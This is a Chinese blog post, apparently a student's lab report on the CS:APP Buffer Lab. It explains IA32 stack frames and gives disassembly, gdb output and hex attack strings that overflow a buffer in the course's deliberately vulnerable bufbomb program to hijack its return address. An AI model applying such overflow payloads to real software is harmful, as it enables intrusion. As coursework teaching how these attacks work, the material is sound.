
<!DOCTYPE html>
<html lang="zh-cn">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="小黑龙的窝">
    <title>归档: 2017/5 - 小黑龙的窝</title>
    <meta name="author" content="BlackDragon">
    
    
    
        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
    
    <meta name="description" content="/* 生命不息 代码不止 */">
<meta property="og:type" content="blog">
<meta property="og:title" content="小黑龙的窝">
<meta property="og:url" content="http://blog.duskdragon.com/archives/2017/05/index.html">
<meta property="og:site_name" content="小黑龙的窝">
<meta property="og:description" content="/* 生命不息 代码不止 */">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="小黑龙的窝">
<meta name="twitter:description" content="/* 生命不息 代码不止 */">
    
    
        
    
    
        <meta property="og:image" content="http://blog.duskdragon.com/assets/images/avatar.jpg"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-2vlb6rbuf0vtqqwvtxzs5fkkvywdbuzxcpzjrb6phlk5lnbldy5aztksln9t.min.css">
    <!--STYLES END-->
    
    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
            
        
    

<header id="header" data-behavior="1">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a class="header-title-link" href="/ ">小黑龙的窝</a>
    </div>
    
        
            <a  class="header-right-picture "
                href="#about">
        
        
            <img class="header-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="1">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a href="/#about">
                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
                </a>
                <h4 class="sidebar-profile-name">BlackDragon</h4>
                
                    <h5 class="sidebar-profile-bio"><p>码龙黑曜 - iOS开发者/计算机科学/兽人控</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/ "
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-home"></i>
                        <span class="sidebar-button-desc">首页</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-categories"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
                        <span class="sidebar-button-desc">分类</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-tags"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
                        <span class="sidebar-button-desc">标签</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-archives"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
                        <span class="sidebar-button-desc">归档</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/about"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-question"></i>
                        <span class="sidebar-button-desc">关于</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://github.com/BlackDragonF" target="_blank" rel="noopener">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-github"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://t.me/BlackDragonF" target="_blank" rel="noopener">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-paper-plane"></i>
                        <span class="sidebar-button-desc">Telegram</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="http://steamcommunity.com/id/BlackDragonF/" target="_blank" rel="noopener">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-steam"></i>
                        <span class="sidebar-button-desc">Steam</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="mailto:obsidiandragon2016@gmail.com" target="_blank" rel="noopener">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-envelope-o"></i>
                        <span class="sidebar-button-desc">邮箱</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/friendly-links"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-link"></i>
                        <span class="sidebar-button-desc">友情链接</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/book-recommend"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-book"></i>
                        <span class="sidebar-button-desc">图书推荐</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="1"
                 class="
                        hasCoverMetaIn
                        ">
                
    <section class="postShorten-group main-content-wrap">
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/05/16/深入理解计算机系统BufferLab实验报告/">
                            深入理解计算机系统BufferLab实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-05-16T14:28:12+08:00">
	
		    5月 16, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/BufferLab" target="_blank" rel="external">Github</a>上</p>
<blockquote>
<p>Buffer Lab是《深入理解计算机系统》（第二版）中的缓冲区溢出实验，现在已经被Attack Lab替代。为了熟悉IA32的栈帧以及过程调用的原理，于2017年5月10日将该实验完成。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。</p>
<p>该实验加深了对于栈规则的理解以及说明了缓冲区溢出漏洞可能造成的危险后果。</p>
<p>该实验同Attack Lab非常相似，但是仅仅采用了代码注入攻击作为攻击手段。同时，也要注意x86和x86_64有着不同的栈帧以及过程的调用方式。</p>
<h3 id="IA32的栈帧以及过程调用"><a href="#IA32的栈帧以及过程调用" class="headerlink" title="IA32的栈帧以及过程调用"></a>IA32的栈帧以及过程调用</h3><h4 id="IA32的栈帧"><a href="#IA32的栈帧" class="headerlink" title="IA32的栈帧"></a>IA32的栈帧</h4><p>IA32的栈帧同x86的栈帧相似，栈从高地址向低地址增长。寄存器%esp保存的是栈帧的栈顶（低地址），寄存器%ebp保存的是栈帧的栈底（高地址）。</p>
<p>调用者的栈帧主要包括了参数区以及返回地址。</p>
<p>被调用者的栈帧的栈底首先是保存的寄存器ebp值（指向调用者的栈底），然后是被保存的寄存器，局部变量以及临时空间，最后是参数构造区。</p>
<h4 id="IA32的过程调用"><a href="#IA32的过程调用" class="headerlink" title="IA32的过程调用"></a>IA32的过程调用</h4><p>IA32提供了如下的过程调用指令：</p>
<ul>
<li>call 该指令将返回地址压入调用者的栈帧，并且将程序计数器%eip指向了被调用者的首地址</li>
<li>leave 该指令一般位于ret指令之前，等价于mov %ebp,%esp和pop %ebp，主要作用是回收栈空间，并且恢复栈顶（%esp）和栈底（%ebp）使得栈帧恢复为调用者栈帧</li>
<li>ret 该指令从栈中弹出返回地址并且让程序计数器eip指向该地址，使程序继续执行被调用者的下一条指令</li>
</ul>
<p>IA32的过程调用遵循如下的规则：</p>
<ol>
<li>首先执行call指令，call会在调用者的栈顶压入返回地址并且使程序计数器指向被调用者</li>
<li>然后保存调用者的栈底即push %ebp，并且将栈顶设置为被调用者的栈底即mov %esp,%ebp</li>
<li>分配局部的栈空间，主要用于临时变量的存储</li>
<li>执行被调用者的指令</li>
<li>执行leave，释放栈空间并重置栈顶（%esp）和栈底（%ebp），使得恢复为调用者栈帧</li>
<li>执行ret，过程返回并继续执行调用者的指令</li>
</ol>
<p>IA32的参数传递规则：<br>同x86不同，IA32不使用寄存器进行参数的传递，IA32从右到左将参数依次压栈，然后调用相应的过程。</p>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中主要包含了以下3个可执行文件：</p>
<ul>
<li>bufbomb 你所要攻击的缓冲区炸弹程序</li>
<li>makecookie 根据你所输入的userid生成一个cookie</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<p>首先我们要输入userid生成一个cookie供后续使用，命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; ./makecookie BlackDragon &gt; cookie                          </div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat cookie                                              </div><div class="line">0x3dde924c</div></pre></td></tr></table></figure></p>
<p>然后我们要将bufbomb反汇编以供后续攻击使用，命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d bufbomb &gt; bufbomb-disassemble</div></pre></td></tr></table></figure></p>
<h3 id="目标程序"><a href="#目标程序" class="headerlink" title="目标程序"></a>目标程序</h3><p>目标程序的通过getbuf函数从标准输入流中读取字符串，并且该函数和Attack Lab中的函数一致，且具有缓冲区溢出的漏洞。这里不再赘述。</p>
<p>值得注意的是，bufbomb函数接受如下的参数：</p>
<ul>
<li>-h 打印帮助信息</li>
<li>-u userid 你应该一直为程序提供该参数，因为远程计分服务器需要该参数，bufbomb也需要该参数去确定你生成的cookie以确定你的攻击满足了条件，并且若干关键的栈地址也和该userid生成的cookie有关</li>
<li>-n 进入’Nitro’模式，在阶段4中使用</li>
<li>-s 将你的攻击字符串作为结果提交至计分服务器</li>
</ul>
<p>同Attack Lab一样，你需要使用hex2raw从攻击代码生成相应的攻击字符串，这里也不再赘述。</p>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="阶段0：蜡烛（Candle）"><a href="#阶段0：蜡烛（Candle）" class="headerlink" title="阶段0：蜡烛（Candle）"></a>阶段0：蜡烛（Candle）</h3><p>在本实验中，关键函数getbuf被test函数调用，getbuf和test函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* getbuf */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE ??</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</div><div class="line">Gets(buf);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* test */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> val;</div><div class="line"><span class="comment">/* Put canary on stack to detect possible corruption */</span></div><div class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();</div><div class="line"></div><div class="line">val = getbuf();</div><div class="line"></div><div class="line"><span class="comment">/* Check for corrupted stack */</span></div><div class="line"><span class="keyword">if</span> (local != uniqueval()) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Sabotaged!: the stack has been corrupted\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Boom!: getbuf returned 0x%x\n"</span>, val);</div><div class="line">validate(<span class="number">3</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Dud: getbuf returned 0x%x\n"</span>, val);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>现在我们希望test函数从getbuf返回时不执行下一条代码，而是跳转至函数smoke，该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Smoke!: You called smoke()\n"</span>);</div><div class="line">validate(<span class="number">0</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先我们需要确定缓冲区的大小，观察bufbomb-disassemble中getbuf的反汇编结果，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">080491f4 &lt;getbuf&gt;:</div><div class="line"> 80491f4:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</div><div class="line"> 80491f5:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</div><div class="line"> 80491f7:       <span class="number">83</span> ec <span class="number">38</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x38,%esp</div><div class="line"> 80491fa:       <span class="number">8d</span> <span class="number">45</span> d8                <span class="keyword">lea</span>    -<span class="number">0x28</span>(%ebp),%eax</div><div class="line"> 80491fd:       <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                <span class="keyword">mov</span>    %eax,(%esp)</div><div class="line"> <span class="number">8049200</span>:       e8 f5 fa ff ff          <span class="keyword">call</span>   8048cfa &lt;Gets&gt;</div><div class="line"> <span class="number">8049205</span>:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</div><div class="line"> 804920a:       c9                      <span class="keyword">leave</span>  </div><div class="line"> 804920b:       c3                      <span class="keyword">ret</span>   </div></pre></td></tr></table></figure></p>
<p>注意到函数总共开辟了0x38=56个字节的栈空间，然后lea -0x28(%ebp),%eax mov %eax,(%esp)进行了参数字符串起始地址的构造，考虑到栈从高地址向低地址延伸，而ebp指向栈底，我们可以推测缓冲区总共是0x28=40个字节。</p>
<p>经过实际测试，可以确定缓冲区确实是40个字节。</p>
<p>下面我们观察反汇编代码，可以得出函数smoke的起始地址为0x08048c18，根据以上的信息，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 18 8c 04 08 /* 保存的%ebp以及返回地址 */</div></pre></td></tr></table></figure></p>
<p>在该阶段中，由于smoke直接使得程序退出，所以我们不需要在意保存的%ebp的值，直接通过缓冲区溢出覆盖返回地址即可。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level0.txt|./hex2raw|./bufbomb -u BlackDragon             </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Smoke!: You called smoke()</div><div class="line">VALID</div><div class="line">NICE JOB!</div><div class="line">run with level1</div></pre></td></tr></table></figure></p>
<p>阶段0完成。</p>
<h3 id="阶段1：火花（Sparkler）"><a href="#阶段1：火花（Sparkler）" class="headerlink" title="阶段1：火花（Sparkler）"></a>阶段1：火花（Sparkler）</h3><p>现在，我们希望getbuf返回时跳转至函数fizz同时能伪装成已经传递了cookie作为参数，该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (val == cookie) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Fizz!: You called fizz(0x%x)\n"</span>, val);</div><div class="line">validate(<span class="number">1</span>);</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: You called fizz(0x%x)\n"</span>, val);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，我们需要注意IA32中，参数是通过调用者的栈进行传递的，我们观察fizz的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">08048c42 &lt;fizz&gt;:</div><div class="line"> 8048c42:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</div><div class="line"> 8048c43:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</div><div class="line"> 8048c45:       <span class="number">83</span> ec <span class="number">18</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x18,%esp</div><div class="line"> 8048c48:       8b <span class="number">45</span> <span class="number">08</span>                <span class="keyword">mov</span>    <span class="number">0x8</span>(%ebp),%eax</div><div class="line"> 8048c4b:       3b <span class="number">05</span> <span class="number">08</span> d1 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">cmp</span>    <span class="number">0x804d108</span>,%eax</div><div class="line"> 8048c51:       <span class="number">75</span> <span class="number">26</span>                   <span class="keyword">jne</span>    8048c79 &lt;fizz+<span class="number">0x37</span>&gt;</div><div class="line"> 8048c53:       <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %eax,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048c57:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> ee a4 <span class="number">04</span>    movl   <span class="number">$0</span>x804a4ee,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048c5e:       <span class="number">08</span></div><div class="line"> 8048c5f:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048c66:       e8 <span class="number">55</span> fd ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048c6b:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048c72:       e8 <span class="number">04</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   804937b &lt;validate&gt;</div><div class="line"> 8048c77:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    8048c91 &lt;fizz+<span class="number">0x4f</span>&gt;</div><div class="line"> 8048c79:       <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %eax,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048c7d:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> <span class="number">40</span> a3 <span class="number">04</span>    movl   <span class="number">$0</span>x804a340,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048c84:       <span class="number">08</span></div><div class="line"> 8048c85:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048c8c:       e8 2f fd ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048c91:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x0,(%esp)</div><div class="line"> 8048c98:       e8 <span class="number">63</span> fc ff ff          <span class="keyword">call</span>   <span class="number">8048900</span> &lt;exit@plt&gt;</div></pre></td></tr></table></figure></p>
<p>从上述反汇编代码的第1行第4行和第5行，我们可以知道函数fizz的起始地址为0x08048c42，val保存在0x8(%ebp)中，cookie保存在固定的地址0x804d108中。根据以上的信息，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 42 8c 04 08 /* 保存的%ebp以及返回地址 */</div><div class="line">00 00 00 00 4c 92 de 3d /* cookie */</div></pre></td></tr></table></figure></p>
<p>在该攻击代码中，前48个字节同阶段0一样，只是将返回地址改成了了函数fizz的起始地址。而最后8个字节则是用来伪装成传递参数的。注意函数从getbuf返回后并不会真正的调用fizz函数，而只是依次的开始执行fizz的指令。</p>
<p>因此，从getbuf返回直到获取到参数val这整个过程中，首先getbuf返回会执行复位操作，将栈顶（%esp）指向第40个字节处（从0开始计算，下同），然后将0x0pop至栈底（%ebp），最后根据返回地址跳转至fizz并pop。现在栈顶（%esp）指向了第48个字节。紧接着，直接开始执行fizz的指令，将%ebp（0）入栈，直至执行到mov 0x8(%ebp),%eax，栈顶（%esp）指向第44个字节。所以，我们的cookie应当放在第(44+8=52）个字节处，直到第55个字节为止。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level1.txt|./hex2raw|./bufbomb -u BlackDragon</div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Fizz!: You called fizz(0x3dde924c)</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<p>阶段1完成。</p>
<h3 id="阶段2：爆竹（FireCracker）"><a href="#阶段2：爆竹（FireCracker）" class="headerlink" title="阶段2：爆竹（FireCracker）"></a>阶段2：爆竹（FireCracker）</h3><p>bufbomb中包含了一个全局变量global_value以及函数bang，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (global_value == cookie) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Bang!: You set global_value to 0x%x\n"</span>, global_value);</div><div class="line">validate(<span class="number">2</span>);</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: global_value = 0x%x\n"</span>, global_value);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，我们希望函数能在返回时跳转至bang，但是在这之前，要将全局变量global_value的值设置为cookie。</p>
<p>该阶段同Attack Lab第1部分的等级2相似，我们需要将程序计数器%eip指向栈，在栈上执行相应的代码，实现相关的修改，最后从栈上返回至函数bang。</p>
<p>首先我们需要确定在进入getbuf时的栈地址，具体的命令和操作如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; gdb bufbomb                                           </div><div class="line">GNU gdb (GDB) 7.12.1</div><div class="line">Copyright (C) 2017 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></div><div class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</div><div class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</div><div class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</div><div class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...<span class="keyword">done</span>.</div><div class="line">(gdb) <span class="built_in">break</span> getbuf</div><div class="line">Breakpoint 1 at 0x80491fa</div><div class="line">(gdb) run -u BlackDragon</div><div class="line">Starting program: /home/user/CSAPPLabs/BufferLab/buflab-handout/bufbomb -u BlackDragon</div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line"></div><div class="line">Breakpoint 1, 0x080491fa <span class="keyword">in</span> getbuf ()</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getbuf:</div><div class="line">   0x080491f4 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x080491f5 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x080491f7 &lt;+3&gt;:	sub    <span class="variable">$0x38</span>,%esp</div><div class="line">=&gt; 0x080491fa &lt;+6&gt;:	lea    -0x28(%ebp),%eax</div><div class="line">   0x080491fd &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08049200 &lt;+12&gt;:	call   0x8048cfa &lt;Gets&gt;</div><div class="line">   0x08049205 &lt;+17&gt;:	mov    <span class="variable">$0x1</span>,%eax</div><div class="line">   0x0804920a &lt;+22&gt;:	leave  </div><div class="line">   0x0804920b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$esp</span></div><div class="line"><span class="variable">$1</span> = 0x55682f18</div><div class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$ebp</span></div><div class="line"><span class="variable">$2</span> = 0x55682f50</div></pre></td></tr></table></figure></p>
<p>通过在gdb中添加断点并观察，我们可以确定在执行函数getbuf时，栈底（%ebp）的值为0x55682f50。</p>
